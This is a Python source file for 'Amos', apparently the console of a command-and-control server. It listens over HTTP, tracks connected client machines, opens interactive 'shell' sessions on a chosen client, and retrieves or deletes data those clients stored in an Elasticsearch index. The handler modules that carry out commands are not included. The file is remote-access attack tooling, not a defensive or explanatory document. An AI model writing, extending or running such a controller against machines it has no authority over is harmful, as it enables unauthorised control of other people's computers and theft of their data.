from http.server import BaseHTTPRequestHandler, HTTPServer
from HttpHandler import MyHandler
from EsHandler import EsHandler
from urllib.parse import parse_qs
import threading


art = """

█████╗ ███╗   ███╗ ██████╗ ███████╗
██╔══██╗████╗ ████║██╔═══██╗██╔════╝
███████║██╔████╔██║██║   ██║███████╗
██╔══██║██║╚██╔╝██║██║   ██║╚════██║
██║  ██║██║ ╚═╝ ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝

"""



print(art)



class Amos:


    def __init__(self, ip, port, db_name, es_url):
        self.ip = ip
        self.port = port
        self.es_url = es_url
        self.port = port
        self.esHandler = EsHandler(db_name, es_url)
        self.server = HTTPServer((self.ip, self.port), MyHandler)



    @staticmethod
    #displays caesar shell commands
    def show_commands():
        user_guide = """
            Amos Commands
                 'guide': [Display Amos user commands]
                 'clients':['lists clients within ES index']
                 'connected':['lists all active connection within ES index']
                 'shell (target ES Client_ID)':['selects a target and creates a session between the server and the client machine ']
                 'delete (target ES Client_ID)': ['remove specified document from index']
                 'delete all': ['remove all document from index']
                 'get (target ES Client_ID)': ['retrieves indexed data of specified target ']
                 'show fields (target ES Client_ID)': ['displays existing field for specified target']
                 'field (target ES Client_ID) (FIELD NAME):  ['displays specified field']
            """
        print(user_guide)



    @staticmethod
    def convert_text(text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"



    def shell_interface(self, http_server):
        print(f'[*] Server started on {self.ip}:{self.port}')
        http_server.RequestHandlerClass.es_handler = self.esHandler

        while True:
            cmd = input(self.convert_text("Amos: "))

            if cmd == 'connected':
                #sends a check call to all clients
                cmd = cmd.strip().lower()
                response = []

                # Create a copy of the keys before iterating
                client_ips = list(http_server.RequestHandlerClass.connected_clients.keys())
                for client_ip in client_ips:
                    check_call_response = http_server.RequestHandlerClass.send_check_call_command(http_server.RequestHandlerClass, client_ip)
                    
                    if check_call_response:
                        response.append(self.esHandler.retrieve_connected_clients(client_ip))
                    else:
                        if client_ip in http_server.RequestHandlerClass.connected_clients:
                            http_server.RequestHandlerClass.connected_clients.pop(client_ip, None)
                            print(f"[-] No response from client with IP: {client_ip}")

                # Check if the response is not empty before processing
                if response:
                    self.esHandler.tabulate_data(response)
                    response.clear()
                else:
                    print("[-] No clients connected!!!.")

                   
            elif cmd.strip() == "":
                pass 

            elif cmd.startswith('shell '):

                client_ip = cmd.split(' ')[1]
                #ip = http_server.RequestHandlerClass.get_client_ip(http_server.RequestHandlerClass, "5CvAcIoB-yjI_UK4Pk2W", self.esHandler)

                if client_ip in http_server.RequestHandlerClass.connected_clients:
                    http_server.RequestHandlerClass.selected_client_ip = client_ip
                    http_server.RequestHandlerClass.continuous_communication(http_server.RequestHandlerClass, client_ip)
                    http_server.RequestHandlerClass.selected_client_ip = None
                else:
                    print("[-] Invalid client IP!!!")

            elif cmd.strip() == "clients":
                cmd = cmd.strip().lower()
                self.esHandler.retrieve_client_information()


            elif cmd.strip() == "guide":
                cmd = cmd.strip().lower()
                self.show_commands()


            elif cmd.rstrip() == "delete all":
                cmd = cmd.strip().lower()
                self.esHandler.delete_all_docs()


            elif cmd.startswith('show fields'):
                cmd = cmd.split()

                if len(cmd) == 3:
                    client_id = cmd[2]
                    self.esHandler.show_fields(client_id)
                else:
                    print("[-]Invalid input!!!")


            elif 'get' in cmd:
                client_id = cmd[4:]
                self.esHandler.retrieve_client_document(client_id)


            elif cmd.startswith('fields'):
                cmd = cmd.split()

                if len(cmd) == 3:
                    client_id = cmd[1]
                    feild_parameter= cmd[2]
                    self.esHandler.get_field(client_id, feild_parameter)
                else:
                    print("[-]Invalid input!!!")


            elif cmd.startswith('delete'):
                cmd = cmd.split()

                if len(cmd) == 2:
                    doc_to_delete = cmd[1]
                else:
                    print("[-]Invalid input!!!")
                self.esHandler.delete_doc(doc_to_delete)

            else:
                print("[-] Invalid command!!!")




    def start(self):
        # Start the HTTP server in a separate thread
        server_thread = threading.Thread(target=self.server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        self.shell_interface(self.server)



if __name__ == '__main__':
    amos_server = Amos('192.168.1.192', 8080, "amos_index", "http://localhost:9200")
    amos_server.show_commands()
    amos_server.start()
   





